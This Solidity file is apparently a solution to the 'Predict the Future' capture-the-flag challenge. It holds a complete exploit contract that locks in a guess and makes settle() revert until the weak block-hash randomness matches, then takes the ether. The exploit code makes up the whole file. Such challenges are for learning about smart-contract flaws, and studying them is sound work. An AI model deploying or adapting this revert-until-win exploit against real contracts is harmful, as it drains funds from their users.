// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

abstract contract PredictTheFutureChallengeInterface {
    function isComplete() public view virtual returns (bool);
    function lockInGuess(uint8 n) public virtual payable;
    function settle() public virtual;
}

contract PredictTheFutureChallengeSolver {
    function lockInGuess(PredictTheFutureChallengeInterface chal)
        external payable {
        chal.lockInGuess{value: msg.value}(0);
    }

    function settle(PredictTheFutureChallengeInterface chal) public {
        chal.settle();
        require(chal.isComplete(), "Keep guesser");

        uint balance = address(this).balance;
        (bool sent, ) = payable(msg.sender).call{value: balance}("");
        require(sent, "Send ether");
    }

    receive() external payable {}
}